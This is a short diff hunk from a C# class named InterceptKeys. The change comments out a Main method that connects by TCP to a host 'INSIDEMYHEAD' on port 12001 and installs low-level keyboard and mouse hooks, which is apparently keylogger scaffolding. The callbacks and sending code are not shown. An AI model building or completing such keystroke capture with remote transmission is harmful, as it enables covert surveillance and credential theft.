@@ -36,29 +36,29 @@ class InterceptKeys
     private static Socket socket;
 
 
-    static void Main()
-    {
+    //static void Main()
+    //{
        
         
-        ccm = new ClientCommunicationManager();
-        socket = ccm.CreateSocket(ProtocolType.Tcp);
-        socket = ccm.Connect("INSIDEMYHEAD", 12001, socket);
+    //    ccm = new ClientCommunicationManager();
+    //    socket = ccm.CreateSocket(ProtocolType.Tcp);
+    //    socket = ccm.Connect("INSIDEMYHEAD", 12001, socket);
 
        
 
 
-        IntPtr hInstance = LoadLibrary("User32");
-        _hookID_ = SetWindowsHookEx(WH_MOUSE_LL, _proc_, hInstance, 0);
-        //_hookID_ = SetWindowsHookEx(WH_MOUSE_LL, HookCallbackMouse, hInstance.Zero, 0);
+    //    IntPtr hInstance = LoadLibrary("User32");
+    //    _hookID_ = SetWindowsHookEx(WH_MOUSE_LL, _proc_, hInstance, 0);
+    //    //_hookID_ = SetWindowsHookEx(WH_MOUSE_LL, HookCallbackMouse, hInstance.Zero, 0);
         
-        //hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, IntPtr.Zero, 0);
-        hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, IntPtr.Zero, 0);
+    //    //hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, IntPtr.Zero, 0);
+    //    hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, IntPtr.Zero, 0);
 
-        Application.Run();
+    //    Application.Run();
 
-        UnhookWindowsHookEx(_hookID_);
-        UnhookWindowsHookEx(hookID);
-    }
+    //    UnhookWindowsHookEx(_hookID_);
+    //    UnhookWindowsHookEx(hookID);
+    //}
 
     private static IntPtr HookCallbackMouse(int nCode, IntPtr wParam, IntPtr lParam)
     {
